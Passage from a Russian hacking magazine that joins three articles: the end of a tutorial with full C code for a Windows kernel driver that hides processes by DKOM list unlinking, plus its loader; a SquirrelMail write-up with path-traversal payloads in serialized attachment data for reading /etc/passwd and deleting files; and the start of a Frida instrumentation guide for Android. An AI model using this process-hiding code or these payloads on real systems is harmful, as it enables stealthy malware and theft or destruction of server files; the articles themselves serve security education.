    PDEVICE_OBJECT pDvcObj = NULL;
    UNICODE_STRING usDrvName, usDosDvcName;
    RtlInitUnicodeString(&usDrvName, NT_DEV_NAME);
    RtlInitUnicodeString(&usDosDvcName, DOS_DEV_NAME);
    status = IoCreateDevice(pDriverObject, 0,
                            &usDrvName,
                            FILE_DEVICE_UNKNOWN,
                            FILE_DEVICE_SECURE_OPEN,
                            FALSE, &pDvcObj);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    status = IoCreateSymbolicLink(&usDosDvcName, &usDrvName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(pDvcObj);
        return status;
    }
    // Настроим IRP на функцию‐заглушку, нашу основную рабочую
функцию и функцию выгрузки драйвера
    // Заполним все коды IRP ссылкой на функцию‐заглушку
    int x;
    for (x = 0; x < IRP_MJ_MAXIMUM_FUNCTION; ++x)
        pDriverObject‐>MajorFunction[x] = MyCallbackFunk;
    pDriverObject‐>MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyCont
rolHide;  // Настроили вызов функции MyCallbackControl на запрос
IRP_MJ_DEVICE_CONTROL
    pDriverObject‐>DriverUnload = DrvUnload;
    return status;
}
VOID DrvUnload(PDRIVER_OBJECT  pDriverObject) {
    // Выгрузка: удаляем символические ссылки и устройство
    IoDeleteSymbolicLink(&usDosDvcName);
    IoDeleteDevice(pDriverObject‐>DeviceObject);
}
NTSTATUS MyCallbackFunk(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
    pIrp‐>IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return pIrp‐>IoStatus.Status;
}
NTSTATUS MyControlHide(PDEVICE_OBJECT pdevObj, PIRP pIrp)
{
    // Получаем указатель на стек IRP пакета
    PIO_STACK_LOCATION pIrpSt = IoGetCurrentIrpStackLocation(pIrp);
    // Получаем размер буфера ввода
    ULONG InBufLen = pIrpSt‐>Parameters.DeviceIoControl.InputB
ufferLength;
    // Получаем размер буфера вывода
    ULONG OutBufLen = pIrpSt‐>Parameters.DeviceIoControl.Output
BufferLength;
    // Получаем код управляющей процедуры
    ULONG CtrlCode = pIrpSt‐>Parameters.DeviceIoControl.IoControlCode
;
    NTSTATUS status = STATUS_SUCCESS;
    switch(CtrlCode){
    case IRP_HIDE_PROC:
        InBufLen = pIrp‐>AssociatedIrp.SystemBuffer;
        pIrp‐>IoStatus.Information = strlen(InBufLen);
        hide_proc(InBufLen);
    break;
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
    break;
    }
    return status;
}
VOID hide_proc(char *pc)
{
    // Модифицируем поля FLink и BLink
    PEPROCESS currentProc = (PEPROCESS)PsGetCurrentProcess();
    PEPROCESS startProc = (PEPROCESS)PsGetCurrentProcess();
    PLIST_ENTRY activeProcLinks;
    PUCHAR pImageFileName;
    PUINT32 pPidProc;
    for (; ((DWORD64)startProc != (DWORD64)currentProc);)
    {
        pImageFileName = (PUCHAR)((DWORD64)currentProc + ImageF
ileName);
        pPidProc = (PUINT32)((DWORD64)currentProc + UniqueProcessId);
        activeProcLinks = (PLIST_ENTRY)((DWORD64)currentProc + Active
ProcessLinks);
        startProc = (PEPROCESS)((DWORD64)activeProcLinks‐>Flink ‐
ActiveProcessLinks);
        if (!strcmp((const char*)pImageFileName, TEXT(pc))) {
            *((PDWORD64)activeProcLinks‐>Blink) = (DWORD64)active
ProcLinks‐>Flink;
            *((PDWORD64)(activeProcLinks‐>Flink) + 1) = (DWORD64)
activeProcLinks‐>Blink;
            activeProcLinks‐>Blink = (PLIST_ENTRY)&activeProcLinks‐>
Flink;
            activeProcLinks‐>Flink = (PLIST_ENTRY)&activeProcLinks‐>
Flink;
        }
    }
}

Самое инте ресное происходит в функции hide_proc, точнее в ее цикле: мы
обходим двусвязный список и модифициру ем поля FLink и BLink. С этого
момента целевой процесс будет скрыт. Теперь перейдем к не менее важному
вопросу — созданию управляющей прог раммы для нашего драйвера. Она
должна загружать драйвер и отправлять ему команды.


Загрузчик драйверов
Загрузить драйвер в ядро можно нес колькими спо собами, самые популярные
из них — это загрузка при помощи SCM (Service Control Manager) и при
помощи  NTAPI‐функции  NtLoadDriver. Мы  выберем  первый  вариант,
как рекомендованный Microsoft и избавляющий нас от многих излишних
манипуляций: основную работу за нас сделает именно Service Control Manag‐
er. Но для начала зададим нужные привилегии:


BOOL setPrivileges(LPCTSTR szPrivName)
{
    TOKEN_PRIVILEGES tp = { 0 };
    HANDLE hToken = 0;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PR
IVILEGES, &hToken))
        std::cout << "OpenProcessToken failed\n";
    if (!LookupPrivilegeValue(NULL, szPrivName, &tp.Privileges[0].
Luid))
        std::cout << "LookupPrivilegeValue failed\n";
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL,
NULL))
    {
        std::cout << "AdjustTokenPrivileges failed\n";
        CloseHandle(hToken);
        return TRUE;
    }
    return FALSE;
}

Вызов функции:


setPrivileges("SeLoadDriverPrivilege");

После этого регистрируем драйвер в системе (проверки на успешность
вызовов умышленно опускаю для лучшей читаемос ти кода):


// Путь к нашему драйверу
#define DRV "c:\\\\Windows\\System32\\drivers\\dkomdrv.sys"
// Имя сервиса
#define SRV "dkomdrv"
// Имя устройства
#define DVC "\\\\.\\dkomdrv"
// Код, говорящий драйверу скрыть процесс
#define IRP_HIDE_PROC 0x801
SC_HANDLE hSCMgr,hSrv;
HANDLE hDvc;
// Открываем SCM
hSCMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
// Создаем сервис
hSrv = CreateService(
    hSCManager,
    TEXT(SRV),
    TEXT(SRV),
    SC_MANAGER_ALL_ACCESS,
    SERVICE_KERNEL_DRIVER,
    SERVICE_DEMAND_START,
    SERVICE_ERROR_IGNORE,
    TEXT(DRV),
    NULL, NULL, NULL, NULL, NULL
);
// Запускаем сервис
StartService(hSrv, 0, NULL);

Итак, драйвер установлен и запущен. Теперь самое важное: мы дол жны пос‐
лать драйверу управляющий код, который заставит его скрыть нужный нам
процесс (он задается переменной pid):


hDvc = CreateFile(
    TEXT(DEVICE),
    GENERIC_READ | GENERIC_WRITE,
    0,
    NULL,
    OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL,
    NULL
);
BOOLEAN total = DeviceIoControl(
    hDevice,
    IRP_HIDE_PROC,  // Наш управляющий код
    pid,
    strlen(pid) + 1,
    retbuf,
    200,
    &bytes_returned,
    (LPOVERLAPPED) NULL
);

После этого нужно закрыть все открытые хендлы, плюс можно добавить про‐
верки успешности вызовов функций, но я решил это все убрать, чтобы ты
видел четкую последовательность действий для заг рузки и управления драй‐
вером, не отвлекаясь ни на что. Пос ле выполнения этого кода нужный про‐
цесс исчезнет из диспетчера задач и из большинс тва приложе ний, которые
работают с процессами.


ИТОГИ
Мы ознакомились с основными понятиями, которые нужно знать о драйверах
режима ядра, и создали собственный драйвер, скрывающий процессы
методом DKOM. Разумеется, это только самое начало пути в изучении драй‐
веров, но в одной статье уместить все невоз можно — по этой теме пишутся
целые книги. Но чтобы начать собственные эксперименты, этого хватит.
Как видишь, писать свои драйверы не так слож но, как могло показаться!
ВЗЛОМ



          УЧИМСЯ ЭКСПЛУАТИРОВАТЬ
              НОВУЮ УЯЗВИМОСТЬ
      aLLy       В ПОЧТОВИКЕ SQUIRRELMAIL
      ONsec
    @iamsecurity


КАК
ПОДЧИНИТЬ
БЕЛКУ



В почтовом сер вере SquirrelMail найдена очередная уяз‐
вимость, и, хоть баг довольно прост, импакт от него крайне
неприятный: любой пользователь может читать или удалять
произвольные файлы в системе. Но досаднее всего для вла‐
дельцев SquirrelMail, что прошел год с момента находки уяз‐
вимости, а разработчики так ее и не запатчили. Давай пос‐
мотрим, откуда она берется и как ее эксплуати ровать.


Почти год назад я писал о дру гой уяз вимости SquirrelMail — тогда речь шла
об RCE, а проблема была в некорректной филь тра ции параметров, которые
отправляются   бинарнику   sendmail.   Через   месяц   пос ле   этого,
в мае 2017 года, исследова тель из TROOPERS18 Флориан Груноу (Florian
Grunow) обнаружил еще одну критическую уяз вимость в этом же продукте.
На сей раз проблема закралась в функцию прикрепле ния фай лов к сооб‐
щению, а успешная экс плуатация поз воляет атакующему читать файлы
на целевой системе.
   Груноу целый год не публиковал информа цию о найденной уязвимости,
ожидая, пока ее закроют. Однако раз работчики за все это время не удосужи‐
лись ему ответить. Терпение у исследова теля кончилось, и он вы ложил
информацию в публичный дос туп.


КАК ТЕСТИРОВАТЬ УЯЗВИМОСТЬ
Перво‐наперво поднимем стенд. Почтовые сервисы — это такой тип при‐
ложений, развертывание которых дает тебе как минимум +3 к навыкам адми‐
нистрирования. Тут много подводных камней, и без погружения в конфиги
не обойтись. Хорошо хоть ста рый доб рый Docker может выручить. Если
не хочешь возиться с настройкой, то качай готовый контейнер из моего
репозитория и переходи к следующему абза цу.
  Запускаем докер и уста навливаем необ ходимый набор сервисов.


docker run ‐ti ‐p80:80 ‐‐rm ‐‐name=squirrel ‐‐hostname=squirrel
debian /bin/bash
apt‐get update && apt‐get install ‐y sendmail wget nano apache2
dovecot‐core dovecot‐imapd php

Скачиваем один из пос ледних дистрибутивов  SquirrelMail. Ссылка легко
может быть недействи тельной, так как разработ чики постоянно обновляют
сборки, удаляя при этом старые архивы.


install ‐d /usr/local/src/downloads
cd /usr/local/src/downloads
wget http://prdownloads.sourceforge.net/squirrelmail/squirr
elmail‐webmail‐1.4.22.tar.gz
mkdir /usr/local/squirrelmail
cd /usr/local/squirrelmail
mkdir data temp attach
chown www‐data:www‐data data temp attach
tar xvzf /usr/local/src/downloads/squirrelmail‐webmail‐1.4.22.tar.gz
mv squirrelmail‐webmail‐1.4.22 www

Теперь нужно создать конфигура ционный файл для Squirrel. Для этих целей
существует конфигуратор.


www/configure

Или по старинке можешь вручную отредактировать дефол тный конфигура‐
ционный файл www/config/config_default.php.
  Для нас глав ное, что в нем нужно ука зать, — это пути, по которым будут
располагаться временные файлы, в том числе прикрепля емые к письмам.
По умолчанию пути такие:
 1. Data Directory: /var/local/squirrelmail/data/.
 2. Attachment Directory: /var/local/squirrelmail/attach/.

Меняем их в соответствии с реальным положением вещей.


sed "s/domain = 'example.com'/domain = 'visualhack'/; s#/var/local/
squirrelmail/#/usr/local/squirrelmail/#g" /usr/local/squirrelmail/
www/config/config_default.php > /usr/local/squirrelmail/www/config/
config.php

Приближаемся к финишной прямой — настройке почтовых сервисов. Ука‐
зываем, какие протоко лы будем использовать.


echo "protocols = imap" > /etc/dovecot/dovecot.conf

Разрешаем авто ризацию по файлу паролей.


echo \!include auth‐passwdfile.conf.ext > /etc/dovecot/conf.d/
10‐auth.conf

Теперь добавим юзера в dovecot, так как для успешной эксплуатации уяз‐
вимости нужно быть авторизованным в системе.


useradd ‐G mail attacker
install ‐d ‐g attacker ‐o attacker /home/attacker
cat /etc/passwd|grep attacker|sed 's/x/{PLAIN}passw/; s/.$//' > /etc/
dovecot/users

Не забываем прописать в конфиге Apache алиас для доступа к дистрибутиву
SquirrelMail и доступ на чтение пап ки, в которой он находится.


cat >>/etc/apache2/apache2.conf <<EOL
Alias /squirrelmail /usr/local/squirrelmail/www
<Directory /usr/local/squirrelmail>
    Options Indexes FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>
EOL

Вот вроде бы и все приготовления. Теперь запус каем тре буемые сервисы
и переходим непосредственно к изу чению уяз вимос ти.


service dovecot start && service apache2 start && service sendmail
start





                Форма авторизации SquirrelMail



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

  КАК ПОДЧИНИТЬ БЕЛКУ
                     УЧИМСЯ ЭКСПЛУАТИРОВАТЬ
              НОВУЮ УЯЗВИМОСТЬ В ПОЧТОВИКЕ
                                    SQUIRRELMAIL





ДЕТАЛИ
Проблема кроется в функции соз дания нового пись ма, так что с этого и нач‐
нем. Авторизуемся и откро ем скрипт compose.php.





            Страница создания нового письма в SquirrelMail

Приложение SquirrelMail написано на PHP, поэто му никаких проблем с чте‐
нием исходников не возникает. За вывод всей формы отвечает метод show‐
InputForm.


/src/compose.php
647:     if ($compose_new_win == '1') {
648:         compose_Header($color, $mailbox);
649:     } else {
650:         displayPageHeader($color, $mailbox);
651:     }
...
695:     showInputForm($session, $values);

Под окошком для текста письма мы видим мес то для прикрепления файлов.
Давай вооружим ся сниф фером, приатта чим что‐нибудь и гля нем на этот про‐
цесс поближе.





               Запрос на прикрепление файла к письму

При нажатии кнопки Attach уходит POST‐запрос на все тот же скрипт com‐
pose.php. В форме передается параметр attach, и отрабатывает сле‐
дующий кусок кода:


/src/compose.php
92: sqgetGlobalVar('attach',$attach, SQ_POST);
...
582: } elseif (isset($attach)) {
...
588:     if (saveAttachedFiles($session)) {
589:         plain_error_message(_("Could not move/copy file. File
not attached"), $color);
590:     }
591:     if ($compose_new_win == '1') {
592:         compose_Header($color, $mailbox);
593:     } else {
594:         displayPageHeader($color, $mailbox);
595:     }
596:     showInputForm($session);
597: }

Как видишь, в строке 588 вызывается функция saveAttachedFiles, она
выпол няет обработку файла и сохранение его во временной директории. Эта
директория задается нас тройкой $attachment_dir в конфигурационном
файле Squirrel config.php.


/src/compose.php
1562: function saveAttachedFiles($session) {
1563:     global $_FILES, $attachment_dir, $username,
1564:         $data_dir, $composeMessage;
...
1567:     if (! is_uploaded_file($_FILES['attachfile']['tmp_name']) )
 {
1568:         return true;
1569:     }
1570:
1571:     $hashed_attachment_dir = getHashedDir($username, $attach
ment_dir);

Название     файла      генерируется     самописной     функцией
GenerateRandomString, которая соз дает строку заданной длины из ран‐
домных буквенно‐цифровых символов.


/src/compose.php
1572:     $localfilename = GenerateRandomString(32, '', 7);
1573:     $full_localfilename = "$hashed_attachment_dir/$localf
ilename";
1574:     while (file_exists($full_localfilename)) {
1575:         $localfilename = GenerateRandomString(32, '', 7);
1576:         $full_localfilename = "$hashed_attachment_dir/$localf
ilename";
1577:     }


/functions/strings.php
614: function GenerateRandomString($size, $chars, $flags = 0) {
615:     if ($flags & 0x1) {
616:         $chars .= 'abcdefghijklmnopqrstuvwxyz';
617:     }
618:     if ($flags & 0x2) {
619:         $chars .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
620:     }
621:     if ($flags & 0x4) {
622:         $chars .= '0123456789';
623:     }
...
629:     sq_mt_randomize(); /* Initialize the random number genera
tor */
630:
631:     $String = '';
632:     $j = strlen( $chars ) ‐ 1;
633:     while (strlen($String) < $size) {
634:         $String .= $chars{mt_rand(0, $j)};
635:     }
636:
637:     return $String;
638: }

Затем временный файл, который был соз дан интерпретатором PHP, пере‐
именовывается и складируется в директорию для хранения аттачей.


/src/compose.php
1581:     if (!@rename($_FILES['attachfile']['tmp_name'], $full_l
ocalfilename)) {
1582:         if (!@move_uploaded_file($_FILES['attachfile']['
tmp_name'],$full_localfilename)) {
1583:             return true;
1584:         }
1585:     }




        Созданный временный файл для прикрепления к письму

В завершение вызывается метод initAttachment класса Message. Он
собирает все файлы, что были прикреплены к письму, в одном массиве enti‐
ties; элементы этого мас сива также экземпляры класса Message.


/src/compose.php
1586:     $type = strtolower($_FILES['attachfile']['type']);
1587:     $name = $_FILES['attachfile']['name'];
1588:     $composeMessage‐>initAttachment($type, $name, $localf
ilename);
1589: }


/class/mime/Message.class.php
1091:     function initAttachment($type, $name, $location) {
1092:         $attachment = new Message();
1093:         $mime_header = new MessageHeader();
1094:         $mime_header‐>setParameter('name', $name);
1095:         $pos = strpos($type, '/');
1096:         if ($pos > 0) {
1097:             $mime_header‐>type0 = substr($type, 0, $pos);
1098:             $mime_header‐>type1 = substr($type, $pos+1);
1099:         } else {
1100:             $mime_header‐>type0 = $type;
1101:         }
1102:         $attachment‐>att_local_name = $location;
1103:         $disposition = new Disposition('attachment');
1104:         $disposition‐>properties['filename'] = $name;
1105:         $mime_header‐>disposition = $disposition;
1106:         $attachment‐>mime_header = $mime_header;
1107:         $this‐>entities[]=$attachment;
1108:     }

Отдельного внимания зас луживает строка 1102, где полный путь до фай ла
вместе с именем сох раня ются в свойстве att_local_name. Когда этот код
отрабатывает, $composeMessage‐>entities содержит все прикрепленные
к письму файлы.
  После этого выполнение вновь передается функции showInputForm. Толь‐
ко теперь у нас име ются прикрепленные файлы, и в дело вступают сле‐
дующие участки кода:


/src/compose.php
1136: function showInputForm ($session, $values=false) {
...
1366:     // composeMessage can be empty when coming from a restored
session
1367:     if (is_object($composeMessage) && $composeMessage‐>entities
)
1368:         $attach_array = $composeMessage‐>entities;
...
1463:     echo addHidden('composesession', $composesession).
1464:         addHidden('querystring', $queryString).
1465:         (!empty($attach_array) ?
1466:         addHidden('attachments', serialize($attach_array)) : ''
).
1467:         "</form>\n";

Помимо вывода списка сохраненных файлов, в форму добавляется скрытое
поле attachments, которое содержит все метаданные этих файлов в виде
десериализованной и URL‐кодированной переменной $composeMessage‐>
entities.





    Сериализованные данные с прикреплен ными к файлу документами

Данные из этого поля считаются легитимными, не проходят никакой фильтра‐
ции и в дальнейшем используются при работе с соз даваемым сообщением
(разумеется, предваритель но пройдя через функцию unserialize).


/src/compose.php
115: sqgetGlobalVar('attachments',           $attachments,
SQ_POST);
...
371: if (!empty($attachments)) {
372:     $attachments = unserialize($attachments);
373:     if (!empty($attachments) && is_array($attachments))
374:         $composeMessage‐>entities = $attachments;
375: }




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

  КАК ПОДЧИНИТЬ БЕЛКУ
                     УЧИМСЯ ЭКСПЛУАТИРОВАТЬ
              НОВУЮ УЯЗВИМОСТЬ В ПОЧТОВИКЕ
                                    SQUIRRELMAIL





УДАЛЕНИЕ ПРОИЗВОЛЬНЫХ ФАЙЛОВ
Самое интересное про исходит при дальнейшей обработке этих данных. Нач‐
нем с возможности уда ления уже прикрепленных аттачей. Отмечаем файл
и жмем Delete Selected Attachments, предварительно включив перехват зап‐
росов.





              Запрос на удаление прикреплен ного файла

Отрабатывает сле дующий участок кода, отвечающий за удаление:


/src/compose.php
113: sqgetGlobalVar('do_delete',             $do_delete,
SQ_POST);
...
613: } elseif (isset($do_delete)) {
...
625:     if (isset($delete) && is_array($delete)) {
626:         foreach($delete as $index) {
627:             if (!empty($composeMessage‐>entities) && isset($
composeMessage‐>entities[$index])) {
628:                 $composeMessage‐>entities[$index]‐>purgeA
ttachments();
631:                 unset ($composeMessage‐>entities[$index]);
632:             }

В нем вызывается метод purgeAttachments, который стирает файлы с диска
при помощи PHP‐функции unlink.


/class/mime/Message.class.php
1114:     function purgeAttachments() {
1115:         if ($this‐>att_local_name) {
1116:             global $username, $attachment_dir;
1117:             $hashed_attachment_dir = getHashedDir($username, $
attachment_dir);
1118:             if ( file_exists($hashed_attachment_dir . '/' . $
this‐>att_local_name) ) {
1119:                 unlink($hashed_attachment_dir . '/' . $this‐>
att_local_name);
1120:             }
1121:         }

А вот и свойство att_local_name, на которое нужно обратить внимание.
Это имя удаляемого файла. Оно попадет пря миком в функцию  unlink.
По задумке разработчиков это лишь название, которое было автоматически
сгенерировано во время загрузки аттача. И все было бы хорошо, только вот
данные о загруженных файлах берутся из формы, а именно — из сериали‐
зованного поля attachments. Это означает, что можно легко контролировать
название удаляемого файла, просто меняя его в запросе. В моем случае
это выглядит так.


...s:14:"att_local_name";s:32:"76Nh2n1ufiHXcSlNYvKe6SbBfpcQC1hG";}}

Думаю, ты уже догадался, что тут можно провернуть. Налицо стандартный
path traversal: при помощи ../ можно выйти из директории с аттачами, про‐
гуляться по диску и удалить что‐нибудь не предус мотренное логикой работы
скрипта. Если ты на память не помнишь, как устроен формат сериализован‐
ных данных в PHP, то подробную информа цию можешь найти на просторах
интернета или в моей статье о внедрении объектов в PHP.
  Специально создам тестовый файл owned в директории /tmp, так как уда‐
лять можно только файлы, раз решенные на запись всем пользователям
или созданные юзером, от которого работает веб‐сервер (в моем случае
это www‐data). Теперь изменяем свойство att_local_name и отправляем
запрос.


...s:14:"att_local_name";s:24:"../../../../../tmp/owned";}}

Файл, конечно же, удалится.





       Успешное удаление произвольного файла через уязвимость


ЧТЕНИЕ ПРОИЗВОЛЬНЫХ ФАЙЛОВ
Тут история немного дру гая, нам нужно заглянуть в функцию отправки сооб‐
щения deliverMessage.


/src/compose.php
1638: function deliverMessage(&$composeMessage, $draft=false) {
1639:     global $send_to, $send_to_cc, $send_to_bcc, $mailprio, $
subject, $body,
1640:         $username, $popuser, $usernamedata, $identity, $idents,
 $data_dir,
1641:         $request_mdn, $request_dr, $default_charset, $color, $
useSendmail,
1642:         $domain, $action, $default_move_to_sent, $move_to_sent;
1643:     global $imapServerAddress, $imapPort, $imap_stream_options,
 $sent_folder, $key;
...
1705:     /* multipart messages */
1706:     if (count($composeMessage‐>entities)) {

Во время выполнения проверя ется наличие аттачей. Затем начинается дос‐
тавка сообщения. В зависимости от установленных нас троек в конфиге
выпол нение программы может прыгать на раз ные ветки, но в итоге все при‐
дет к выполнению метода mail из клас са Deliver.


/src/compose.php
1826:     if ($stream) {
1827:         $deliver‐>mail($composeMessage, $stream, $reply_id, $
reply_ent_id);
1828:         $succes = $deliver‐>finalizeStream($stream);
1829:     }


/class/deliver/Deliver.class.php
075:     function mail(&$message, $stream=false, $reply_id=0, $reply_
ent_id=0,
076:                   $imap_stream=NULL, $extra=NULL) {
...
138:         $this‐>send_mail($message, $header, $boundary, $stream,
$raw_length, $extra);

Далее он выполняет вызов send_mail.


/class/deliver/Deliver.class.php
167:     function send_mail($message, $header, $boundary, $stream=
false,
168:                        &$raw_length, $extra=NULL) {
169:
170:         if ($stream) {
171:             $this‐>preWriteToStream($header);
172:             $this‐>writeToStream($stream, $header);
173:         }
174:         $this‐>writeBody($message, $stream, $raw_length, $
boundary);
175:     }

Выпол нение переходит к методу writeBody, который отправляет тело соз‐
данного сообщения, в том числе и прикрепленные файлы. Тут логика ана‐
логична удалению: если ука зано свойство att_local_name, то оно исполь‐
зуется в качестве имени файла, только на этот раз для чте ния из временной
директории с аттачами.


/class/deliver/Deliver.class.php
338:             } elseif ($message‐>att_local_name) {
339:                 global $username, $attachment_dir;
340:                 $hashed_attachment_dir = getHashedDir($username,
 $attachment_dir);
341:                 $filename = $message‐>att_local_name;
342:                 $file = fopen ($hashed_attachment_dir . '/' . $
filename, 'rb');
343:
344:                 while ($tmp = fread($file, 570)) {
...
356:                 fclose($file);
357:             }

Поэтому, манипулируя att_local_name, мы можем отправлять себе на почту
локальные файлы с сервера, дос тупные для чтения.
  Перехватим запрос с отправкой сооб щения и  укажем /etc/passwd
в качестве аттача.


...s:14:"att_local_name";s:24:"../../../../../etc/passwd";}}





         Измененный запрос на отправку пись ма в SquirrelMail

Необязательно даже дожидать ся доставки письма или вообще отправлять
его на валидный адрес, чтобы про читать файл. Достаточно после нажатия
кнопки «Отправить» перейти в раз дел Sent, где хранятся копии отправленных
писем. Затем открыть нужное и загрузить требуемый аттач с помощью кнопки
Download.





               Чтение произвольных файлов в SquirrelMail


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
Увы, даже настолько простые уяз вимос ти могут легко оставаться незаме чен‐
ными на протяже нии мно гих лет. В данной ситуации удивляет скорее без дей‐
ствие команды разработчиков SquirrelMail. Такие возможнос ти, как чтение
и удаление произвольных файлов в системе, вряд ли можно считать секь‐
юрной фичей. Я все же надеюсь, что патч, который исправит этот досадный
баг, выйдет в ближайшее время и очередной про дукт станет чуточку безопас‐
нее.
 ВЗЛОМ





                                                                                 Евгений Зобнин
                                                                                        Редактор Unixoid и Mobile
                                                                                                      zobnin@glc.ru

ИНЪЕКЦИЯ
ДЛЯ АНДРОИДА





                    ВНЕДРЯЕМ КОД
              В ЧУЖИЕ ПРИЛОЖЕНИЯ
                С ПОМОЩЬЮ FRIDA




 Когда мы говорим о взломе и модификации чужих приложе‐
 ний, то чаще всего подразумеваем использование деком‐
 пилятора, дизас семблера и отладчика. Но есть инструмент,
 который работает совершенно ина че. Это Frida, тулкит, поз‐
 воляющий внедриться в процесс и переписать его части
 на языке JavaScript.


 НЕМНОГО СЛОВОБЛУДИЯ
 Представь, что тебе в руки попал семпл малвари. Ты запускаешь его в эму‐
  ляторе и пытаешься проана лизировать поведение. Но оказывается, что
  в эмуляторе он работа ет совсем не  так, как на реальном устрой стве,
  и никакой подозрительной активнос ти не про явля ет: мал варь умеет опре‐
  делять, что находится в эмулиру емой среде.
    Ты об этом догадываешься и поэтому реша ешь запустить малварь
  под дебаггером (предваритель но рас паковав зловред и добавив строчку an‐
  droid:debuggable="true"  в AndroidManifest.xml),  чтобы опре делить,
  как именно малварь производит проверку на эмулятор. И снова проблема:
  она умеет определять, что работает под отладчиком, и просто падает
  при запуске. Сле дующий шаг: ста тичес кий анализ кода с помощью деком‐
  пилятора и дизассемблера, правка с целью вырезать куски, проверяющие
  наличие отладчика и эмулиру емой среды, снова правка кода по причине
 ошибки и все в таком духе.
    А теперь представь, что у тебя есть инс трумент, поз воляющий прямо
  во время работы приложения отключить все эти про верки, прос то переписав
  проверочные функции на JavaScript. Никаких дизас семблерных листингов
  smali, никаких правок низкоуровневого кода, никаких пересборок приложе‐
  ния; ты просто подклю чаешься к работающему приложению, находишь нуж‐
  ную функцию и переписываешь ее тело. Недурно, не так ли?


 FRIDA
  Frida — это так называемый Dinamic Instrumentation Toolkit, то есть набор инс‐
  трументов, позволяющих на лету внедрять собс твенный код в дру гие при‐
  ложения. Ближайшие аналоги Frida — это знаменитый Cydia Substrate для iOS
  и Xposed Framework для Android, те самые фрей мворки, благодаря которым
  появились твики. Frida отличается от них тем, что нацеле на на быс трую правку
  кода в режиме реального времени. Отсюда и язык JavaScript вместо Objec‐
  tive‐C или Java, и отсутствие необходимости упа ковы вать «твики» в нас‐
  тоящие приложения. Ты прос то подключаешься к процессу и меняешь его
  поведение, исполь зуя интерактивную JS‐консоль (ну или отдаешь команду
  на загрузку ранее написанного скрипта).
     Frida умеет работать с приложениями, написанными для всех популярных
 ОС, включая Windows, Linux, macOS, iOS и даже QNX. Мы же будем исполь‐
  зовать ее для модификации приложений под Android.
     Итак, что тебе нужно:
   1. Машина под управлением Linux. Можно и Windows, но, когда занимаешься
    пентестом приложений для Android, лучше исполь зовать Linux.
   2. Установленный  adb. В Ubuntu/Debian/Mint  уста навливается командой
    sudo aptget install adb.
   3. Рутованный смартфон или эмулятор на базе Android 4.2 и выше. Frida уме‐
     ет работать и на нерутованном, но для этого тебе придется модифициро‐
     вать APK подопытного приложения. Это просто неудобно.

  Для начала установим Frida:


  $ sudo pip install frida

 Далее скачаем сервер Frida, который необ ходимо установить на смартфон.
 Сервер можно найти на GitHub, его версия дол жна точно совпадать с вер‐
  сией Frida, которую мы уста новили на комп. На момент написания статьи
  это была 10.6.55. Скачива ем:


  $ cd ~/Downloads
  $ wget https://github.com/frida/frida/releases/download/10.6.55/
  frida‐server‐10.6.55‐android‐arm.xz
  $ unxz frida‐server‐10.6.55‐android‐arm.xz

 Подключаем смартфон к компу, включаем отладку по USB (Настройки →
  Для разработчиков → Отладка по USB) и закиды ваем сервер на смартфон:


  $ adb push frida‐server‐10.6.55‐android‐arm /data/local/tmp/
  frida‐server

  Теперь заходим на смартфон с помощью adb shell, выс тавляем нужные
  права на сервер и запускаем его:


  $ adb shell
  > su
  > cd /data/local/tmp
  > chmod 755 frida‐server
  > ./frida‐server


 ПЕРВЫЕ ШАГИ
  Ок, Frida установлена на комп, сервер запущен на смартфоне (не закрывай
  терминал с запущенным сервером). Теперь надо проверить, все ли работает
  как надо. Для этого воспользуемся командой frida‐ps:


  $ frida‐ps ‐U





  Команда должна вывести все процес сы, запущенные на смартфоне (флаг ‐U
  означает USB, без него Frida выведет список процессов на локальной
  машине). Если ты видишь этот список, зна чит, все хорошо и можно прис‐
  тупать к более интересным вещам.
    Для начала попробуем выполнить трассировку системных вызовов. Frida
  позволяет отсле дить обра щения к любым нативным функциям, в том чис ле
  системные вызовы ядра Linux. Для примера возьмем системный вызов open(
  ), который используется для открытия файлов на чтение и/или запись. Запус‐
  тим трассировку Телеграма:


  $ frida‐trace ‐i "open" ‐U org.telegram.messenger

  Возьми телефон и немного потыкай интерфейс Телег рама. На экран дол жны
  посыпаться сообщения пример но следующего содержания:


  open(pathname="/data/user/0/org.telegram.messenger/shared_prefs/
  userconfing.xml", flags=0x241)

  Эта строка означает, что Телеграм открыл файл userconfig.xml внутри
  каталога shared_prefs в своем приватном каталоге. Каталог shared_prefs
  в Android используется для хра нения нас троек, поэто му нетрудно догадаться,
  что файл userconfig.xml содержит настройки приложения. Еще одна
  строка:


  open(pathname="/storage/emulated/0/Android/data/org.telegram.messen
  ger/cache/223023676_121163.jpg", flags=0x0)

  Здесь все еще проще. Телеграм агрессивно кеширует загруженные данные,
  поэтому для отображения картинки он взял ее из кеша.


  open(pathname="/data/user/0/org.telegram.messenger/shared_prefs/
  stats.xml", flags=0x241)

 Еще один файл в каталоге shared_prefs. Судя по всему, какая‐то статистика
  использования.


  open(pathname="/dev/ashmem", flags=0x2)

  Выглядит странно, не так ли? На самом деле все просто. Файл /dev/ashmem
  виртуальный, он исполь зуется для обмена данными между процес сами и сис‐
  темой с помощью IPC‐механизма Binder. Проще говоря, эта строка означает,
  что Телеграм обратился к Android, чтобы выполнить какую‐то системную фун‐
  кцию или получить информацию. Такие строки можно сме ло пропускать.


 ПИШЕМ КОД
 Мы можем перехватывать обра щения к любым дру гим системным вызовам,
  например connect(), который используется для под ключения к удаленным
  хостам:


  $ frida‐trace ‐i "connect" ‐U com.yandex.browser

 Но вывод в данном случае будет не особо информативным:


